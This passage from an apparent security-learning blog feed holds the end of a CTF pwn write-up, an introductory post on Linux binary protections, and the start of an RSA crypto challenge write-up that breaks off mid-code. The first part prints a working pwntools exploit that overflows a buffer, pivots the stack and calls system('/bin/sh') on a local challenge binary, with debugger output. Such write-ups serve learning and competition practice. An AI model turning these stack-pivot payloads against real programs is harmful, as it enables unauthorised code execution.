punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome, my friend. What's your name?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>vul:</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-28h]</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0x30u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, %s\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0x30u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, %s\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="Exploit-Script"><a href="#Exploit-Script" class="headerlink" title="Exploit Script"></a>Exploit Script</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true"># buf_size = 0x28</span><span class="token comment" spellcheck="true"># read_size = 0x30</span><span class="token comment" spellcheck="true"># buf_addr = ebp - 0x28</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># vul loop1:</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'good boy1'</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">,</span><span class="token string">'b *vul+104'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804b000</span><span class="token operator">-</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'vul'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">''' Program Status‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ REGISTERS ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ EAX  0x30 EBX  0x0 ECX  0xfff9442c ‚óÇ‚Äî 'Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n' EDX  0xf7ee2890 ‚óÇ‚Äî 0x0 EDI  0xf7ee1000 ‚óÇ‚Äî 0x1d9d6c ESI  0xf7ee1000 ‚óÇ‚Äî 0x1d9d6c EBP  0xfff969a8 ‚Äî‚ñ∏ 0x804af00 ‚óÇ‚Äî 0x0 ESP  0xfff96980 ‚óÇ‚Äî 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' EIP  0x80485fd (vul+104) ‚óÇ‚Äî leave  ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ DISASM ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ   0x80485ee &lt;vul+89>     push   eax   0x80485ef &lt;vul+90>     push   0x80486ca   0x80485f4 &lt;vul+95>     call   printf@plt &lt;0x80483e0>   0x80485f9 &lt;vul+100>    add    esp, 0x10   0x80485fc &lt;vul+103>    nop     ‚ñ∫ 0x80485fd &lt;vul+104>    leave     0x80485fe &lt;vul+105>    ret       0x80485ff &lt;main>       lea    ecx, dword ptr [esp + 4]   0x8048603 &lt;main+4>     and    esp, 0xfffffff0   0x8048606 &lt;main+7>     push   dword ptr [ecx - 4]   0x8048609 &lt;main+10>    push   ebp‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ STACK ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ00:0000‚îÇ esp  0xfff96980 ‚óÇ‚Äî 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'... ‚Üì‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ BACKTRACE ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ ‚ñ∫ f 0  80485fd vul+104‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄBreakpoint *vul+104pwndbg> stack 2000:0000‚îÇ esp  0xfff96980 ‚óÇ‚Äî 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'... ‚Üì0a:0028‚îÇ ebp  0xfff969a8 ‚Äî‚ñ∏ 0x804af00 ‚óÇ‚Äî 0x00b:002c‚îÇ      0xfff969ac ‚Äî‚ñ∏ 0x804859b (vul+6) ‚óÇ‚Äî sub    esp, 4'''</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''**********Notes*************{???} means a program address random....{==>} means point to....{&lt;= } means value at the address'''</span><span class="token triple-quoted-string string">'''*********cover ebp**********ebp = ??? ==> 0x804af00 &lt;= 0'''</span><span class="token triple-quoted-string string">'''***** hijacking ebp and cover return address to vul+6 ******leave:     mov esp,ebp ;            esp = ??? ==>0x804af00 &lt;= 0    pob ebp ;                     esp = ???+4 ;         ebp = 0x804af00 &lt;=0ret vul+6;'''</span><span class="token comment" spellcheck="true">#vul loop2:</span><span class="token comment" spellcheck="true">#gadget</span>leave_ret <span class="token operator">=</span> <span class="token number">0x80484b8</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'good boy2'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804aed8</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/bin/sh\0'</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804aed4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">,</span><span class="token string">'b *vul+104'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''******** send payload ********1.buf_addr = ebp - 0x28 = 0x804af00 - 0x28 = 0x804aed82.(0x804aed8 + 0x10 = 0x804aef8) This value was writed in 0x 804aef0...It means that args point to '/bin/sh' at 0x804aef8...3.ebp = 0x804af00 ==> 0x804aed4 &lt;= 04.leave:        mov esp,ebp:            esp = 0x804af00 ==> 0x804aed4 &lt;= 0 ;         pop ebp:            esp = 0x804af04 ==> leave_ret;            ebp = 0x804aed4;5.ret leave_ret'''</span><span class="token triple-quoted-string string">'''******* leave_ret*********leave:    mov esp,ebp:        esp = 0x804aed4 &lt;= 0;    pop ebp:        esp = 0x804aed8 ==> system        ebp = 0x0;ret system('/bin/sh');----------------------------------------------------------------------------pwndbg> stack 3000:0000‚îÇ esp  0x804aed8 ‚Äî‚ñ∏ 0x8048400 (system@plt) ‚óÇ‚Äî jmp    dword ptr [0x804a018]01:0004‚îÇ      0x804aedc ‚óÇ‚Äî 0x002:0008‚îÇ      0x804aee0 ‚Äî‚ñ∏ 0x804aee8 ‚óÇ‚Äî '/bin/sh'03:000c‚îÇ      0x804aee4 ‚óÇ‚Äî 0x004:0010‚îÇ      0x804aee8 ‚óÇ‚Äî '/bin/sh'05:0014‚îÇ      0x804aeec ‚óÇ‚Äî 0x68732f /* '/sh' */06:0018‚îÇ      0x804aef0 ‚óÇ‚Äî 0x0... ‚Üì0a:0028‚îÇ      0x804af00 ‚Äî‚ñ∏ 0x804aed4 ‚óÇ‚Äî 0x00b:002c‚îÇ      0x804af04 ‚Äî‚ñ∏ 0x80484b8 (deregister_tm_clones+40) ‚óÇ‚Äî leave  0c:0030‚îÇ      0x804af08 ‚óÇ‚Äî 0x0------------------------------------------------------------------------------'''</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>MindÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190719201500.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Ciscn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Binary_Security_Guidance</title>
      <link href="/2019/07/18/Binary-Security-Guidance/"/>
      <url>/2019/07/18/Binary-Security-Guidance/</url>
      
        <content type="html"><![CDATA[<p>Here is a summary of knowledge points for binary security. The reason for this article is that I can learn binary security specificallyüòÑ.</p><a id="more"></a><p>[TOC]</p><h1 id="‚úâBinary-Security-Guidance"><a href="#‚úâBinary-Security-Guidance" class="headerlink" title="‚úâBinary_Security_Guidance"></a>‚úâBinary_Security_Guidance</h1><blockquote><p>Binary security refers to guaranteeing the information security of binary data when transmitting data, that is, not being tampered with, decoded and so on. If attacked, it can be detected in time.</p><p>Binary security includes some things of cryptography, such as encryption and decryption, signature and so on.</p><p>In <code>CTF</code> competitions, binary security usually appear in the form of <code>reverse</code> and <code>pwn</code>. You will get a compiled program to analyze its logic and then crack it.</p></blockquote><h2 id="üìñLinux-Pwn"><a href="#üìñLinux-Pwn" class="headerlink" title="üìñLinux Pwn"></a>üìñLinux Pwn</h2><blockquote><p>Cause pwn of linux is normally favorite example form now. So i decide to start pwn from linux platform.</p></blockquote><h3 id="Security-protection-mechanism"><a href="#Security-protection-mechanism" class="headerlink" title="Security protection mechanism"></a>Security protection mechanism</h3><blockquote><p>In the linux, we can use instructions called <code>checksec</code> to see the security protection mechanism of our target program. So the first we should know is kinds of protection mechanism.</p></blockquote><p> <img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190718144432.png" alt=""></p><h4 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h4><blockquote><p>Canary is a kind of protection technique to mitigate stack overflow.</p><p>You can set the canary by following args.</p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#Quoted From CTF-WIKI</span><span class="token comment" spellcheck="true">#enables protection, but only inserts protection for functions that have arrays in local variables</span>-fstack-protector <span class="token comment" spellcheck="true">#Enable protection, insert protection for all functions</span>-fstack-protector-all -fstack-protector-strong<span class="token comment" spellcheck="true">#Only protects functions with explicit stack_protect attribute</span>-fstack-protector-explicit <span class="token comment" spellcheck="true">#Disable protection.</span>-fno-stack-protector </code></pre><p>Here is a example to understand what role canary play.</p><pre class=" language-bash"><code class="language-bash">        High        Address <span class="token operator">|</span>                 <span class="token operator">|</span>                +-----------------+                <span class="token operator">|</span> args            <span class="token operator">|</span>                +-----------------+                <span class="token operator">|</span> <span class="token keyword">return</span> address  <span class="token operator">|</span>                +-----------------+        rbp <span class="token operator">=</span><span class="token operator">></span>  <span class="token operator">|</span> old ebp         <span class="token operator">|</span>                +-----------------+      rbp-8 <span class="token operator">=</span><span class="token operator">></span>  <span class="token operator">|</span> canary value    <span class="token operator">|</span>                +-----------------+<span class="token operator">|</span> Local variables <span class="token operator">|</span>        Low     <span class="token operator">|</span>                 <span class="token operator">|</span>        Address</code></pre><p>The canary value is usually stored in <code>TLS==&gt;fs:[0x28]</code>, this value is also called <code>stack_guard</code>. If the canary value was changed illegally, the program flow will go to a func called <code>__stack_chk_fail</code> in glibc. And then you can‚Äôt crack the program as you think, it will prevent the easy stack overflow.(PS: Bypass Canary will be talked later‚Ä¶)</p><h4 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h4><blockquote><p>Nx(No Excute) enabled means instructions in stack won‚Äôt be allowed to execute. Normally attack ways like <code>call esp</code> and <code>jmp esp</code> will out of action. But we can use ROP technique to bypass NX. </p></blockquote><h4 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h4><blockquote><p>RELRO, this kind of protection mechanism has two form: <code>Partial RELRO</code> and <code>Full RELRO</code>. If program was Full RELRO, we wouldn‚Äôt change the <code>Got-table</code>.</p></blockquote><h4 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h4><blockquote><p>PIEÔºàposition-independent executableÔºâ enabled means program‚Äôs memory address is random while running the program each time.</p><p>The basic address is 0x400000 when program‚Äôs status is <code>No-PIE</code>.</p></blockquote><h4 id="RWX"><a href="#RWX" class="headerlink" title="RWX"></a>RWX</h4><blockquote><p>Has RWX(Read&amp;Write&amp;Execute) segments means program has some segments you have the power to read, write and execute.</p><p>You can try to understand it by following picture:</p></blockquote><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190718153217.png" alt=""></p><h3 id="Common-Attack-Ways"><a href="#Common-Attack-Ways" class="headerlink" title="Common Attack Ways"></a>Common Attack Ways</h3><blockquote><p>So what we should learn then? It‚Äôs no denying we should aim at understanding basic principles of common attack ways. </p></blockquote><ul><li>Stack overflow</li><li>Format string vulnerability</li><li>Glibc Heap uses</li><li>IO_FILE uses</li><li>Conditional competition</li><li>Integer overflow</li><li>Sandbox escape</li><li>Linux Kernel</li><li>Others Framework(like arm,arch)</li></ul><h2 id="üìñReverse"><a href="#üìñReverse" class="headerlink" title="üìñReverse"></a>üìñReverse</h2><p>later‚Ä¶</p><h2 id="‚è±Concluding-remarks"><a href="#‚è±Concluding-remarks" class="headerlink" title="‚è±Concluding remarks"></a>‚è±Concluding remarks</h2><p>Fighting or losing, depend on yourselfüòÄ.</p>]]></content>
      
      
      <categories>
          
          <category> Binary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Binary </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019Âº∫ÁΩëÊùØ_Copperstudy</title>
      <link href="/2019/05/29/2019%E5%BC%BA%E7%BD%91%E6%9D%AF-Copperstudy/"/>
      <url>/2019/05/29/2019%E5%BC%BA%E7%BD%91%E6%9D%AF-Copperstudy/</url>
      
        <content type="html"><![CDATA[<p>‰∏ÄÈÅìRSAËøá‰∏ÄÈÅçÂêÑÁßçÊîªÂáª„ÄÇ</p><a id="more"></a><p>[TOC]</p><h1 id="üö©2019Âº∫ÁΩëÊùØ-Copperstudy"><a href="#üö©2019Âº∫ÁΩëÊùØ-Copperstudy" class="headerlink" title="üö©2019Âº∫ÁΩëÊùØ_Copperstudy"></a>üö©2019Âº∫ÁΩëÊùØ_Copperstudy</h1><blockquote><p>üò≠Âç°Âú®Á¨¨‰∫îÂÖ≥Ôºå‰∏ÄÁúãwpÂèëÁé∞Â∞ëcopy‰∫Ü‰∏Ä‰∏™nÔºå‰ª•‰∏∫ÊúânÂíåm‰∏§‰∏™Êú™Áü•Êï∞Ôºàps:sageÁúüÂº∫Â§ßÔºâ„ÄÇ</p></blockquote><h2 id="‚úÖChallenge-0"><a href="#‚úÖChallenge-0" class="headerlink" title="‚úÖChallenge 0"></a>‚úÖChallenge 0</h2><p>Âè™ÈúÄÁàÜÁ†¥ÂæóÂá∫skrÁöÑÂÄºÔºåËøôÊòØÈó®Êßõ„ÄÇ</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>proof<span class="token punctuation">:</span> skr<span class="token operator">=</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>skr<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span>a904dcc09fcdc1d641905b0b50513922c94ad030223cf8eb3bbaa9b21b6788a5<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>skr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span></code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#------------step 1</span>cipher <span class="token operator">=</span> <span class="token string">''</span>skr_part <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token keyword">for</span> a <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> b <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> skr_part <span class="token operator">+</span> chr<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span>c<span class="token punctuation">)</span>            result <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#print(result)</span>            <span class="token keyword">if</span>  result <span class="token operator">==</span> cipher<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span 